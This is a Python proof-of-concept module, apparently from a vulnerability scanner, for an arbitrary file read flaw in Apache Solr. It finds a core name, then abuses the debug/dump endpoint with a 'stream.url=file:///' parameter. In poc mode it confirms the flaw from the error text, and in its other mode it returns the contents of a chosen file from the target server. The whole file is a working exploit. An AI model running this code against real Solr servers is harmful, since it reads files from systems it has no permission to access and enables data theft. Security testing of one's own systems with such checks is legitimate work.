# -*- coding:utf-8 -*-
# Apache Solr 任意文件读取

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from vulscan_Project.requestClass import Requests


class POC:

    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)

    def solr_file_poc(self, url, db="", filename="passerW.txt", type="poc"):
        try:
            if db == "":
                resp = self.requestUtil.get(url + "/solr/admin/cores?_=1626521816720&indexInfo=false&wt=json").json()
                db = list(resp["status"].keys())[0]
            resp = self.requestUtil.get(
                url + "/solr/%s/debug/dump?param=ContentStreams&stream.url=file:///%s" % (db, filename))
            if type == "poc":
                if "No such file or directory" in resp.text:
                    return db
                else:
                    return False
            else:
                resp = resp.json()
                return resp["streams"][0]["stream"]
        except Exception as e:
            print(e)
            return ""

    def fingerprint(self):
        try:
            if "solr" in self.service.title.lower():
                return True
        except:
            return False

    def poc(self):
        try:
            result = self.solr_file_poc(self.service.url)
            if result:
                print((["Apache Solr 任意文件读取", "可用应用: %s" % result], result))
                return (["Apache Solr 任意文件读取", "可用应用: %s" % result], result)
        except:
            return []
